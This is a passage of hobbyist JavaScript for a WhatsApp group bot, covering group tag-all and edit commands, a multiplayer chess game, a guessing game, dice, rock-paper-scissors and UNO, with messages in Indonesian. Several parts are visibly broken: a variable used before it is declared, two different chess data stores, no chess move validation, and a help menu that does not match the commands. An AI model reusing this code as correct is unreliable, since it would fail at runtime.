      mentions: participants.map(a => a.id)
    }, {
      quoted: m
    })
  }
}
break

case 'totag': {
  if (!m.isGroup) return XRG()
  if (!isOwner && !isAdmins) return XRA()
  if (!isBotAdmins) return XRBADM
  if (!m.quoted) return reply(`Kutip pesan dengan caption ${XyrooRynzz}`)
  Alice.sendMessage(m.chat, {
    forward: m.quoted.fakeObj,
    mentions: participants.map(a => a.id)
  })
}
break

case 'editsubjek': {
if (!m.isGroup) return XRG()
if (!isAdmins && !isOwner) return XRA()
if (!isBotAdmins) return XRBADM
if (!text) return reply('Text nya ?')
await Alice.groupUpdateSubject(m.chat, text).then((res)).catch((err) => reply(jsonformat(err)))
}
break

case 'editdesk':{
if (!m.isGroup) return XRG()
if (!isAdmins && !isOwner) return XRA()
if (!isBotAdmins) return XRBADM
if (!text) return reply('Text Nya ?')
await Alice.groupUpdateDescription(m.chat, text).then((res)).catch((err) => reply(jsonformat(err)))
}
break

case 'tagall': {
if (!m.isGroup) return XRG()
if (!isAdmins) return XRA()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
Alice.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Group Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Game Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'crypto': {
  const handleCrypto = require('./AliceSystem/AliceDatabase/Game/crypto.js');
  if (typeof handleCrypto !== 'function') return reply('⚠️ Modul crypto tidak valid.');
  handleCrypto(m, command, args, reply);
}
break;
case 'koboy': {
  const koboyHandler = require('./AliceSystem/AliceDatabase/Game/koboy.js');

  // Parsing args dan teks
  const teks = m.text || ''; // teks asli dari pesan
  const bagian = teks.trim().split(/\s+/); // pisah dengan spasi
  const args = bagian.slice(1); // hapus kata ".koboy"

  // Debug cek command & argumen
  console.log('[Alice.js] koboy command dipanggil!');
  console.log('[Alice.js] args:', args);

  if (typeof koboyHandler !== 'function') return reply('⚠️ Modul koboy tidak valid.');
  
  // Jalankan handler dengan parameter lengkap
  koboyHandler(m, command, args, reply, db);
  break;
}
case 'catur': {
if (!m.mentionedJid || m.mentionedJid.length === 0)
  return reply('❌ Tag pengguna untuk ditantang!\nContoh: *.catur @user*')

const lawan = m.mentionedJid[0]
if (lawan === sender) return reply('Kamu tidak bisa menantang dirimu sendiri.')

if (caturData[m.chat]) return reply('❌ Masih ada game di chat ini.')

  caturData[m.chat] = {
    player1: sender,
    player2: lawan,
    turn: 'white',
    board: papanAwal(),
    status: 'pending',
    winner: null
  }
  saveCatur()
  return reply(`♟️ Tantangan dikirim ke @${lawan.split('@')[0]}!\n\nBalas dengan *.caturterima* untuk main.\nGunakan *.caturhelp* untuk panduan lengkap.`, m.chat, { mentions: [lawan] })
}
break

case 'caturterima': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'pending') return reply('❌ Tidak ada tantangan aktif.')
  if (game.player2 !== sender) return reply('Kamu bukan yang ditantang.')

  game.status = 'ongoing'
  saveCatur()
  return reply(`♟️ Game dimulai!\nGiliran: *Putih* (${game.player1 == sender ? 'Kamu' : '@' + game.player1.split('@')[0]})\n\n${tampilkanPapan(game.board)}`, m.chat, { mentions: [game.player1, game.player2] })
}
break

case 'caturtolak': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'pending') return reply('❌ Tidak ada tantangan aktif.')
  if (game.player2 !== sender) return reply('Kamu bukan yang ditantang.')

  delete caturData[m.chat]
  saveCatur()
  return reply('❌ Tantangan ditolak.')
}
break

case 'caturpapan': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'ongoing') return reply('❌ Tidak ada game berjalan.')

  return reply(`♟️ Papan saat ini:\n\n${tampilkanPapan(game.board)}\nGiliran: *${game.turn === 'white' ? 'Putih' : 'Hitam'}*`)
}
break

case 'caturlangkah': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'ongoing') return reply('❌ Tidak ada game berjalan.')

  const [fromRaw, toRaw] = text.trim().split(" ")
  const from = fromRaw?.toLowerCase()
  const to = toRaw?.toLowerCase()
  if (!from || !to) return reply('Gunakan: *.caturlangkah e2 e4*')

  const col = { a:0,b:1,c:2,d:3,e:4,f:5,g:6,h:7 }
  const fx = 8 - parseInt(from[1]), fy = col[from[0]]
  const tx = 8 - parseInt(to[1]), ty = col[to[0]]

  const isWhite = game.turn === 'white'
  const currentPlayer = isWhite ? game.player1 : game.player2
  if (sender !== currentPlayer) return reply('⏳ Bukan giliranmu.')

  if (isNaN(fx) || isNaN(fy) || isNaN(tx) || isNaN(ty)) return reply('❌ Posisi tidak valid.')

  const piece = game.board[fx][fy]
  if (!piece) return reply('❌ Tidak ada bidak di posisi itu.')
  if (isWhite && !'♙♖♘♗♕♔'.includes(piece)) return reply('Itu bukan bidakmu.')
  if (!isWhite && !'♟♜♞♝♛♚'.includes(piece)) return reply('Itu bukan bidakmu.')

  game.board[tx][ty] = piece
  game.board[fx][fy] = ''
  game.turn = isWhite ? 'black' : 'white'
  saveCatur()

   // TIMER GILIRAN OTOMATIS (jika disetel)
  if (global.caturTimer && global.caturTimer[m.chat]) {
  const waktu = global.caturTimer[m.chat]
  clearTimeout(game.timeoutId)
  game.timeoutId = setTimeout(() => {
    let kalah = game.turn === 'white' ? game.player1 : game.player2
    let menang = game.turn === 'white' ? game.player2 : game.player1

    delete caturData[m.chat]
    saveCatur()

    const skor = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Game/caturSkor.json'))
    skor[menang] = skor[menang] || { menang: 0, kalah: 0 }
    skor[kalah] = skor[kalah] || { menang: 0, kalah: 0 }
    skor[menang].menang++
    skor[kalah].kalah++
    fs.writeFileSync('./AliceSystem/AliceDatabase/Game/caturSkor.json', JSON.stringify(skor, null, 2))

    Alice.sendMessage(m.chat, {
      text: `⏰ Waktu habis! @${kalah.split('@')[0]} dianggap kalah.\n🏆 Pemenang: @${menang.split('@')[0]}`,
      mentions: [menang, kalah]
    })
  }, waktu * 1000)
}

  return reply(`✅ Langkah berhasil!\n\n${tampilkanPapan(game.board)}\nGiliran: *${game.turn === 'white' ? 'Putih' : 'Hitam'}*`)
}
break

case 'caturmenyerah': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'ongoing') return reply('❌ Tidak ada game berjalan.')

  if (sender !== game.player1 && sender !== game.player2) return reply('Kamu bukan pemain di game ini.')

// Update skor
const skor = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Game/caturSkor.json'))
skor[pemenang] = skor[pemenang] || { menang: 0, kalah: 0 }
skor[sender] = skor[sender] || { menang: 0, kalah: 0 }
skor[pemenang].menang++
skor[sender].kalah++
fs.writeFileSync('./AliceSystem/AliceDatabase/Game/caturSkor.json', JSON.stringify(skor, null, 2))

  const pemenang = sender === game.player1 ? game.player2 : game.player1
  game.status = 'selesai'
  game.winner = pemenang
  saveCatur()

  return reply(`🏳️ Pemain menyerah. Pemenang: @${pemenang.split('@')[0]}`, m.chat, { mentions: [pemenang] })
}
break

case 'caturselesai': {
  if (!isOwner) return reply('❌ Hanya owner yang bisa paksa menyelesaikan.')
  if (caturData[m.chat]) {
    delete caturData[m.chat]
    saveCatur()
    return reply('✅ Game dipaksa selesai.')
  } else return reply('Tidak ada game aktif.')
}
break

case 'caturhelp': {
  let teks = `┌───⌈ *📖 ᴘᴀɴᴅᴜᴀɴ ᴄᴀᴛᴜʀ ᴍᴜʟᴛɪᴘʟᴀʏᴇʀ* ⌋
│
│ ♟️ Bermain catur langsung di grup bersama temanmu!
│ Tersedia sistem papan, giliran, skor, ranking, dan kontrol penuh.
│
│ 🎮 *Cara Memulai:*
│ ➤ .catur@tag
│     Tantang pemain lain untuk memulai permainan.
│
│ ⚙️ *Kontrol Permainan:*
│ ➤ .caturstatus
│     Cek giliran dan papan saat ini.
│ ➤ .caturskip
│     Lewati giliran jika perlu.
│ ➤ .caturdraw
│     Ajukan atau terima hasil seri.
│ ➤ .caturmenyerah
│     Menyerah dan mengakhiri permainan.
│ ➤ .caturhapus
│     (Admin) Hapus pertandingan aktif.
│
│ 📊 *Skor & Ranking:*
│ ➤ .caturnilai
│     Statistik menang, kalah, dan seri kamu.
│ ➤ .caturrank
│     Lihat posisi kamu dalam peringkat.
│ ➤ .caturtop10
│     Top 10 pemain catur terbaik.
│ ➤ .caturskorreset
│     (Owner) Reset skor pemain tertentu.
│
│ ♟️ *Papan & Analisa:*
│ ➤ .caturnext
│     Siapa giliran sekarang?
│ ➤ .caturboard
│     Lihat papan dalam bentuk ASCII.
│ ➤ .caturhistory
│     Lihat langkah-langkah permainan.
│ ➤ .caturanalisa
│     Langkah terakhir yang dilakukan.
│
│ ⏱️ *Timer & Notifikasi:*
│ ➤ .caturtimer
│     Aktifkan timer giliran otomatis (3 menit).
│ ➤ .caturnotif
│     Notif jika pemain diam > 3 menit.
│
│ 📌 *Tambahan:*
│ ➤ .caturhelp
│     Tampilkan menu panduan ini.
│
│ 🔢 *Total fitur catur saat ini:* 17 fitur lengkap
│ 📅 Versi: Multiplayer Turn-based | ASCII Mode
│ 📈 Dukungan: Skor, Ranking, Timer, Analisa, Admin tools
│
└─────⌈ ♟️ Jadilah legenda catur grupmu! ⌋`
  reply(teks)
}
break

case 'caturrank': {
  const skor = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Game/caturSkor.json'))
  if (!Object.keys(skor).length) return reply('❌ Belum ada pemain yang memiliki skor.')

  const urut = Object.entries(skor)
    .sort((a, b) => b[1].menang - a[1].menang)
    .slice(0, 10)
    .map(([id, data], i) => `*${i + 1}.* @${id.split('@')[0]} — 🏆 ${data.menang} menang`)

  return reply(`🏁 *RANKING CATUR TOP 10*\n\n${urut.join('\n')}`, m.chat, {
    mentions: urut.map(v => v.match(/@(\d+)/)[0] + '@s.whatsapp.net')
  })
}
break

case 'caturstatus': {
  const game = caturData[m.chat]
  if (!game) return reply('❌ Tidak ada game catur di chat ini.')

  const status = {
    pending: '🕐 Menunggu lawan menerima...',
    ongoing: '♟️ Sedang berlangsung',
    selesai: `🏁 Selesai — Pemenang: @${game.winner?.split('@')[0] || 'Tidak diketahui'}`
  }[game.status] || '❓ Tidak diketahui'

  const p1 = '@' + game.player1.split('@')[0]
  const p2 = '@' + game.player2.split('@')[0]

  return reply(`♟️ *Status Game Catur:*\n• Pemain 1: ${p1}\n• Pemain 2: ${p2}\n• Status: ${status}`, m.chat, {
    mentions: [game.player1, game.player2, game.winner]
  })
}
break

case 'caturnilai': {
  const skor = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Game/caturSkor.json'))
  const data = skor[sender] || { menang: 0, kalah: 0 }

  return reply(`📊 *Skor Catur Kamu*\n\n🏆 Menang : ${data.menang}\n💀 Kalah : ${data.kalah}`)
}
break

case 'caturlawan': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'ongoing') return reply('❌ Tidak ada game berlangsung.')

  const lawan = sender === game.player1 ? game.player2 : (sender === game.player2 ? game.player1 : null)
  if (!lawan) return reply('Kamu bukan bagian dari game ini.')

  return reply(`🎯 Lawan kamu adalah: @${lawan.split('@')[0]}`, m.chat, {
    mentions: [lawan]
  })
}
break

case 'caturgiliran': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'ongoing') return reply('❌ Tidak ada game yang sedang berjalan.')

  const isWhite = game.turn === 'white'
  const giliran = isWhite ? game.player1 : game.player2

  return reply(`⏳ Sekarang giliran: @${giliran.split('@')[0]} (${isWhite ? 'Putih' : 'Hitam'})`, m.chat, {
    mentions: [giliran]
  })
}
break

case 'caturrematch': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'selesai') return reply('❌ Tidak ada game selesai untuk rematch.')

  if (sender !== game.player1 && sender !== game.player2)
    return reply('Kamu bukan bagian dari game sebelumnya.')

  const lawan = sender === game.player1 ? game.player2 : game.player1
  caturData[m.chat] = {
    player1: sender,
    player2: lawan,
    turn: 'white',
    board: papanAwal(),
    status: 'pending',
    winner: null
  }
  saveCatur()

  return reply(`🔁 Rematch dikirim ke @${lawan.split('@')[0]}!\nKetik *caturterima* untuk bermain ulang.`, m.chat, {
    mentions: [lawan]
  })
}
break

case 'caturafk': {
  const game = caturData[m.chat]
  if (!game || game.status !== 'ongoing') return reply('❌ Tidak ada game yang sedang berjalan.')

  if (!isOwner && sender !== game.player1 && sender !== game.player2)
    return reply('Hanya pemain atau owner yang bisa membatalkan.')

  delete caturData[m.chat]
  saveCatur()
  return reply('⚠️ Game dibatalkan karena lawan dianggap AFK.')
}
break

case 'caturwaktu': {
  if (!isOwner) return reply('❌ Hanya owner yang bisa mengatur waktu giliran.')
  let waktu = parseInt(text)
  if (isNaN(waktu) || waktu < 10) return reply('Gunakan contoh: *caturwaktu 60* (detik minimal 10)')

  if (!global.caturTimer) global.caturTimer = {}
  global.caturTimer[m.chat] = waktu
  return reply(`⏱️ Batas waktu giliran disetel ke ${waktu} detik.`)
}
break

case 'caturreset': {
  if (!isOwner) return reply('❌ Hanya owner yang bisa reset data.')

  fs.writeFileSync('./database/catur.json', '{}')
  fs.writeFileSync('./database/caturSkor.json', '{}')
  if (global.caturTimer) global.caturTimer[m.chat] = undefined

  return reply('✅ Semua data catur berhasil direset.')
}
break

case 'caturskip': {
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan aktif.")
  let game = dbCatur[m.chat]
  if (game.turn === 'white' && m.sender !== game.playerWhite ||
      game.turn === 'black' && m.sender !== game.playerBlack)
    return reply("❌ Bukan giliranmu.")

  game.turn = game.turn === 'white' ? 'black' : 'white'
  reply(`⏩ *${m.pushName}* melewatkan giliran.
🔁 Giliran selanjutnya: *${game.turn === 'white' ? game.nameWhite : game.nameBlack}*`)
  fs.writeFileSync(caturPath, JSON.stringify(dbCatur, null, 2))
}
break

case 'caturdraw': {
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan.")
  let game = dbCatur[m.chat]
  if (!game.drawRequest) {
    game.drawRequest = m.sender
    reply(`🤝 *${m.pushName}* mengajukan hasil seri.  
Jika lawan setuju, ketik *caturdraw* juga untuk menyetujui.`)
  } else if (game.drawRequest !== m.sender) {
    let lawan = game.drawRequest
    reply(`🤝 Pertandingan diakhiri dengan hasil *Seri*.`, m.chat, { mentions: [m.sender, lawan] })
    if (!dbSkor[m.sender]) dbSkor[m.sender] = { menang: 0, kalah: 0, seri: 0 }
    if (!dbSkor[lawan]) dbSkor[lawan] = { menang: 0, kalah: 0, seri: 0 }
    dbSkor[m.sender].seri++
    dbSkor[lawan].seri++
    delete dbCatur[m.chat]
    fs.writeFileSync(caturSkorPath, JSON.stringify(dbSkor, null, 2))
    fs.writeFileSync(caturPath, JSON.stringify(dbCatur, null, 2))
  } else {
    reply("❌ Kamu sudah mengajukan permintaan seri, tunggu respon lawan.")
  }
}
break

case 'caturhapus': {
  if (!isOwner && !isAdmins) return reply("❌ Hanya admin atau owner yang bisa menghapus pertandingan.")
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan untuk dihapus.")
  delete dbCatur[m.chat]
  fs.writeFileSync(caturPath, JSON.stringify(dbCatur, null, 2))
  reply("✅ Pertandingan catur dihapus.")
}
break

case 'caturnext': {
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan.")
  let game = dbCatur[m.chat]
  let giliran = game.turn === 'white' ? game.nameWhite : game.nameBlack
  reply(`🔁 Sekarang giliran: *${giliran}*`)
}
break
case 'caturboard': {
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan.")
  let game = dbCatur[m.chat]
  let papan = game.board.ascii()
  reply(`♟️ Papan Catur Saat Ini:\n\n${papan}`)
}
break
case 'caturtimer': {
  if (!isOwner && !isAdmins) return reply("❌ Hanya owner/admin yang bisa menyalakan timer.")
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan.")

  global.caturTimer = global.caturTimer || {}
  if (global.caturTimer[m.chat]) {
    clearTimeout(global.caturTimer[m.chat])
    delete global.caturTimer[m.chat]
    return reply("⏱️ Timer giliran *dimatikan*.")
  } else {
    global.caturTimer[m.chat] = setTimeout(() => {
      let game = dbCatur[m.chat]
      if (!game) return
      let kalah = game.turn === 'white' ? game.playerWhite : game.playerBlack
      let menang = game.turn === 'white' ? game.playerBlack : game.playerWhite
      reply(`⏰ Waktu habis!\n@${kalah.split('@')[0]} kalah karena tidak bergerak.\n🎉 Pemenang: @${menang.split('@')[0]}`, m.chat, { mentions: [kalah, menang] })
      if (!dbSkor[menang]) dbSkor[menang] = { menang: 0, kalah: 0, seri: 0 }
      if (!dbSkor[kalah]) dbSkor[kalah] = { menang: 0, kalah: 0, seri: 0 }
      dbSkor[menang].menang++
      dbSkor[kalah].kalah++
      delete dbCatur[m.chat]
      fs.writeFileSync(caturPath, JSON.stringify(dbCatur, null, 2))
      fs.writeFileSync(caturSkorPath, JSON.stringify(dbSkor, null, 2))
    }, 3 * 60 * 1000) // 3 menit
    reply("⏱️ Timer giliran *dinyalakan* (3 menit per giliran).")
  }
}
break
case 'caturhistory': {
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan.")
  let game = dbCatur[m.chat]
  let moves = game.board.history()
  if (moves.length === 0) return reply("📜 Belum ada langkah yang dilakukan.")
  reply(`📜 Riwayat Langkah:\n${moves.map((m, i) => `${i + 1}. ${m}`).join('\n')}`)
}
break
case 'caturskorreset': {
  if (!isOwner) return reply("❌ Hanya owner yang bisa reset skor.")
  let target = m.mentionedJid?.[0] || m.sender
  if (!dbSkor[target]) return reply("❌ Pengguna belum punya skor.")
  delete dbSkor[target]
  fs.writeFileSync(caturSkorPath, JSON.stringify(dbSkor, null, 2))
  reply(`✅ Skor catur @${target.split('@')[0]} telah di-reset.`, m.chat, { mentions: [target] })
}
break
case 'caturanalisa': {
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan.")
  let game = dbCatur[m.chat]
  let langkah = game.board.history()
  if (langkah.length === 0) return reply("📜 Belum ada langkah yang dilakukan.")
  let last = langkah[langkah.length - 1]
  reply(`📊 Langkah terakhir: *${last}*`)
}
break
case 'caturtop10': {
  if (Object.keys(dbSkor).length === 0) return reply('❌ Belum ada skor.')

  let top = Object.entries(dbSkor).map(([jid, skor]) => {
    return {
      jid,
      poin: (skor.menang || 0) * 3 + (skor.seri || 0),
      menang: skor.menang,
      seri: skor.seri,
      kalah: skor.kalah
    }
  }).sort((a, b) => b.poin - a.poin).slice(0, 10)

  let teks = `🏆 *Top 10 Pemain Catur*\n\n`
  top.forEach((p, i) => {
    teks += `${i + 1}. @${p.jid.split('@')[0]} | ${p.poin} pts (W:${p.menang}, D:${p.seri}, L:${p.kalah})\n`
  })
  reply(teks, m.chat, { mentions: top.map(x => x.jid) })
}
break
case 'caturnotif': {
  if (!isOwner && !isAdmins) return reply("❌ Hanya owner/admin yang bisa aktifkan notif.")
  if (!dbCatur[m.chat]) return reply("❌ Tidak ada pertandingan.")

  global.caturTimer = global.caturTimer || {}
  if (global.caturTimer[m.chat]) {
    clearTimeout(global.caturTimer[m.chat])
    delete global.caturTimer[m.chat]
    return reply("🔕 Notifikasi diam *dimatikan*.")
  }

  let game = dbCatur[m.chat]
  global.caturTimer[m.chat] = setTimeout(() => {
    let sekarang = game.turn === 'white' ? game.playerWhite : game.playerBlack
    Alice.sendMessage(m.chat, {
      text: `⏳ @${sekarang.split('@')[0]}, giliranmu belum dimainkan selama 3 menit.`,
      mentions: [sekarang]
    })
  }, 3 * 60 * 1000)

  reply("🔔 Notifikasi diam *dinyalakan* (giliran tidak dimainkan >3 menit).")
}
break
// Catur Features End

case 'tebakld': {
  let leaderboard = loadLeaderboard();

  // Ubah jadi array dan urutkan berdasar score desc
  let sorted = Object.entries(leaderboard)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 10); // Top 10

  if (sorted.length === 0) return reply('📊 Leaderboard masih kosong.');

  let teks = '📊 *Leaderboard Tebak-Tebakan*\n\n';
  let rank = 1;
  for (let [userId, score] of sorted) {
    teks += `${rank}. @${userId.split('@')[0]} - ${score} poin\n`;
    rank++;
  }

  return reply(teks, { mentions: sorted.map(([u]) => u) });
}
break;
case 'tebak': {
  const quizPath = './AliceSystem/AliceDatabase/Game/Alice-TebakGame.json';
  if (!fs.existsSync(quizPath)) return reply('⚠️ File .json tidak ditemukan.');

  const data = JSON.parse(fs.readFileSync(quizPath));
  const kategoriUnik = [...new Set(data.map(item => item.kategori))];

  const kategori = args[0]?.toLowerCase();
  if (!kategori) {
    const daftar = kategoriUnik.join(', ');
    return reply(`📚 Gunakan: .tebak [kategori]\nContoh: .tebak lagu\n\nKategori yang tersedia:\n${daftar}`);
  }

  if (!kategoriUnik.includes(kategori)) {
    return reply(`❌ Kategori "${kategori}" tidak ditemukan.\nKategori yang tersedia: ${kategoriUnik.join(', ')}`);
  }

  const soalKategori = data.filter(item => item.kategori === kategori);
  const soal = soalKategori[Math.floor(Math.random() * soalKategori.length)];

  if (!global.tebakGame) global.tebakGame = {};
  global.tebakGame[m.sender] = {
    jawaban: soal.jawaban,
    soal: soal.soal,
    petunjuk: soal.petunjuk || 'Petunjuk tidak tersedia'
  };

  return reply(`🧠 Tebak kategori *${kategori}* dari petunjuk ini:\n\n${soal.soal}`);
}
break
			case 'dadu': {
				let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 },{ url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 },{ url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 },{ url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 },{ url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 },{ url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
				let media = pickRandom(ddsa)
				try {
					await Alice.sendImageAsSticker(m.chat, media.url, m, { packname: packname, author: author, isAvatar: 1 })
				} catch (e) {
					let anu = await fetch(media.url)
					let una = await anu.buffer()
					await Alice.sendImageAsSticker(m.chat, una, m, { packname: packname, author: author, isAvatar: 1 })
				}
			}
			break
case 'patroli': {
if (!m.isGroup) return XRG()
if (isBan) return XRB()
await XReaction()
  const participants = (await Alice.groupMetadata(m.chat)).participants
  if (participants.length < 4) return reply('Minimal 4 member di grup untuk menjalankan game ini!')
  const memberIDs = participants
    .map(p => p.id)
    .filter(id => id !== Alice.user.jid)
  const shuffled = memberIDs.sort(() => Math.random() - 0.5)
  const polisi = shuffled[0]
  const pencuri = shuffled[1]
  const tahun = Math.floor(Math.random() * 3) + 1;
  const hasil = `🚨 *Patroli Berhasil, Maling Telah Ditemukan!!*\n\n` +
    `👮 Polisi: @${polisi.split('@')[0]}\n` +
    `🕵 Pencuri: @${pencuri.split('@')[0]}\n\n` +
    `!!Pencuri Ditangkap! Dan Dipenjara Selama ${tahun} tahun`

  Alice.sendMessage(m.chat, {
    text: hasil,
    mentions: [polisi, pencuri, tahun]
  }, { quoted: m })
}
break

case 'suitbot': {
if (!m.isGroup) return XRG()
if (isBan) return XRB()
await XReaction()
				const userChoice = text.toLowerCase();
				const choices = ['batu', 'gunting', 'kertas'];
				const botChoice = choices[Math.floor(Math.random() * choices.length)];
				if (!choices.includes(userChoice)) {
					return reply(`Pilih antara *batu*, *gunting*, atau *kertas* ya, Kak!\nContoh: ${XyrooRynzz} batu`);
				}
				let hasil = '';
				if (userChoice === botChoice) {
					hasil = `Kita Seri! kamu Pilih *${botChoice}* Dan aku juga pilih *${botChoice}*`;
				} else if (
					(userChoice === 'batu' && botChoice === 'gunting') ||
					(userChoice === 'gunting' && botChoice === 'kertas') ||
					(userChoice === 'kertas' && botChoice === 'batu')
				) {
					hasil = `😞 ${botname} Kalah, ${pushname} menang 👍\nAku pilih *${botChoice}*`;
				} else {
					hasil = `Yess, ${botname} menang! ${botname} pilih *${botChoice}*`;
				}
    reply(hasil);
}

break;
case "uno":
{
if (isBan) return XRB()
await XReaction()
    if (!m.isGroup) {
        return reply("This command can only be used in group chats.");
    }

    const games = readUnoGameData();
    const args = text.split(' ');
    const command = args[0];
    const subCommand = args.slice(1).join(' ');

    if (!games[m.chat]) {
        games[m.chat] = {
            players: [],
            deck: createDeck(),
            discardPile: [],
            currentPlayer: 0,
            direction: 1,
            currentCard: null,
            drawStack: 0,
            blockCardPlayed: false,
            reverseCardPlayed: false,
            stopVotes: new Set(),
            awaitingColorChoice: false
        };
        writeUnoGameData(games);
        return reply("UNO game started! Type 'uno join' to join.");
    }

    const game = games[m.chat];

    switch (command) {
        case "join":
            if (game.players.find(player => player.id === m.sender)) {
                return reply("You have already joined the game.");
            }
            game.players.push({ id: m.sender, hand: [] });
            writeUnoGameData(games);
            return reply("You have joined the UNO game!");

        case "start":
            if (game.players.length < 2) {
                return reply("At least 2 players are required to start the game.");
            }
            game.deck = shuffle(game.deck);
            game.players.forEach(player => {
                for (let i = 0; i < 7; i++) {
                    player.hand.push(game.deck.pop());
                }
            });
            game.currentCard = game.deck.pop();
            game.discardPile.push(game.currentCard);
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "info":
            return reply(`
UNO Rules and How to Play:

1. Join the game:
   - Use \`uno join\` to join the game.
   - Use \`uno start\` to start the game after at least 2 players have joined.

2. Draw a card:
   - Use \`uno draw\` to draw a card from the deck. If a special card forces you to draw cards, you will draw all required cards.

3. Play a card:
   - Use \`uno play <card_index>\` to play a card. The card must match the color or number of the card on the discard pile, or you can use a black card to change the color.
   - Special cards:
     - \`12\`: The next player draws two cards and is skipped.
     - \`14\`: The next player draws four cards and is skipped.
     - \`10\`: The next player is skipped.
     - \`11\`: The play direction is reversed.
     - \`wild13\`: The player chooses a new color.
     - \`wild14\`: The next player draws four cards and is skipped.

4. Skip a turn:
   - Use \`uno pass\` if you cannot or do not want to play a card on your turn.

5. Check your hand:
   - Use \`uno hand\` to see the cards in your hand.

6. Check the card image:
   - Use \`uno card <card_index>\` to check the image of the card in your hand.

7. End the game:
   - The first player to use all their cards wins the game.

8. Stop the game:
   - Use \`uno stop\` to request to stop the game. All players must agree, or an admin/creator can stop the game directly.
`);

        case "stop":
            const player = game.players.find(p => p.id === m.sender);
            if (!player) {
                return reply("You have not joined the game.");
            }

            if (isAdmins || isOwner) {
                delete games[m.chat];
                writeUnoGameData(games);
                return reply("UNO game stopped by admin/creator.");
            }

            game.stopVotes.add(m.sender);
            if (game.stopVotes.size === game.players.length) {
                delete games[m.chat];
                writeUnoGameData(games);
                return reply("UNO game stopped with all players' agreement.");
            }

            writeUnoGameData(games);
            return reply(`Stop request accepted. ${game.players.length - game.stopVotes.size} more players need to agree.`);

        case "hand":
            const playerHand = game.players.find(p => p.id === m.sender);
            if (!playerHand) {
                return reply("You have not joined the game.");
            }
            const hand = playerHand.hand.map((card, index) => `${index}: ${card.color} ${card.value}`).join("\n");
            const iniHandText = `*Uno Game ${botname}*\n_still under construction_\n\nYour Cards:\n${hand}`;
            await Alice.sendMessage(m.sender, { text: iniHandText }, { quoted: m });
            return reply('Check your cards!');

        case "card":
            const cardIndex = parseInt(subCommand);
            if (isNaN(cardIndex) || cardIndex < 0 || cardIndex >= game.players.find(p => p.id === m.sender).hand.length) {
                return reply("Invalid card.");
            }
            const card = game.players.find(p => p.id === m.sender).hand[cardIndex];
            const cardImageUrl = getCardImageUrl(card);
            const cardText = `${card.color} ${card.value}`;
            await Alice.sendMessage(m.sender, { image: { url: cardImageUrl }, caption: cardText }, { quoted: m });
            return reply('Card image sent!');

        case "play":
            const currentPlayer = game.players[game.currentPlayer];
            if (currentPlayer.id !== m.sender) {
                return reply("It's not your turn!");
            }

            const playCardIndex = parseInt(subCommand);
            if (isNaN(playCardIndex) || playCardIndex < 0 || playCardIndex >= currentPlayer.hand.length) {
                return reply("Invalid card.");
            }

            const playCard = currentPlayer.hand[playCardIndex];
            if (!isValidPlay(game.currentCard, playCard)) {
                return reply("The card cannot be played.");
            }

            if (playCard.value === "12") {
                game.drawStack += 2;
            } else if (playCard.value === "wild14") {
                if (hasPlayableCard(currentPlayer, game.currentCard)) {
                    return reply("The Wild Draw Four card can only be played if you have no matching card.");
                }
                game.drawStack += 4;
                game.currentCard.color = "black";
                game.awaitingColorChoice = true;
            } else if (playCard.value === "10") {
                game.currentPlayer = getNextPlayer(game);
            } else if (playCard.value === "11") {
                game.direction *= -1;
            }

            game.currentCard = playCard;
            game.discardPile.push(playCard);
            currentPlayer.hand.splice(playCardIndex, 1);

            if (currentPlayer.hand.length === 0) {
                delete games[m.chat];
                writeUnoGameData(games);
                return reply(`Player ${m.sender} wins!`);
            }

            game.currentPlayer = getNextPlayer(game);
            game.reverseCardPlayed = false;
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "pass":
            const passPlayer = game.players[game.currentPlayer];
            if (passPlayer.id !== m.sender) {
                return reply("It's not your turn!");
            }
            game.currentPlayer = getNextPlayer(game);
            game.reverseCardPlayed = false;
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "color":
    if (!game.awaitingColorChoice || game.players[game.currentPlayer].id !== m.sender) {
        return reply("No color needs to be selected at this time.");
    }

    const chosenColor = subCommand.trim().toLowerCase();
    if (!["red", "yellow", "green", "blue"].includes(chosenColor)) {
        return reply("Invalid color. Choose one of: red, yellow, green, blue.");
    }

    game.currentCard.color = chosenColor;
    game.awaitingColorChoice = false;
    game.currentPlayer = getNextPlayer(game);
    writeUnoGameData(games);
